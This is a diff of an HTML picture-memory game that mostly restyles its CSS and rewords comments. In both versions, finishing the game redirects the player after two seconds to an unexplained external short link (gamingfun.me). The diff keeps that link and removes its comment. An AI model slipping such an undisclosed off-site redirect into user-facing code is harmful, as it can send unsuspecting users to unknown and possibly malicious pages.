@@ -1,20 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Picture Memory Game</title>
   <style>
-    .card { width: 100px; height: 100px; margin: 10px; display: inline-block; border: 1px solid #333; background: #f0f0f0; cursor: pointer; }
-    .card img { width: 100%; height: 100%; display: none; }
-    .card.flipped img { display: block; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f8f8;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0; padding: 0;
+    }
+    h2 { margin-top: 22px; }
+    #game {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      max-width: 440px;
+      margin: 20px auto;
+      gap: 8px;
+    }
+    .card {
+      width: 90px;
+      height: 90px;
+      background: #e3e3e3;
+      border-radius: 12px;
+      border: 2px solid #bbbbbb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.09);
+      transition: border 0.13s;
+    }
+    .card.flipped {
+      border-color: #44c882;
+    }
+    .card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: none;
+      border-radius: 10px;
+    }
+    .card.flipped img {
+      display: block;
+    }
   </style>
 </head>
 <body>
-  <h2>Memory Game</h2>
+  <h2>Picture Memory Game</h2>
   <div id="game"></div>
   <script>
-    // Image file names for 8 pairs
-    let images = ["pic1.jpg","pic2.jpg","pic3.jpg","pic4.jpg","pic5.jpg","pic6.jpg","pic7.jpg","pic8.jpg"];
-    // Duplicate each for pairs (16 cards)
+    // Your image file names for pairs
+    let images = ["pic1.jpg", "pic2.jpg", "pic3.jpg", "pic4.jpg", "pic5.jpg", "pic6.jpg", "pic7.jpg", "pic8.jpg"];
+    // Duplicate for 8 pairs = 16 cards
     let gameImages = [...images, ...images];
     // Shuffle
     gameImages = gameImages.sort(() => Math.random() - 0.5);
@@ -22,8 +66,7 @@
     let gameContainer = document.getElementById("game");
     let flippedCards = [];
     let matched = 0;
-
-    // Create cards
+    // Generate cards
     gameImages.forEach((img, idx) => {
       let card = document.createElement("div");
       card.className = "card";
@@ -41,7 +84,7 @@
             flippedCards = [];
             if (matched === gameImages.length) {
               setTimeout(function() {
-                window.location.href = "https://gamingfun.me/6MXNRF"; // Redirect after 2 seconds
+                window.location.href = "https://gamingfun.me/6MXNRF";
               }, 2000);
             }
           } else {
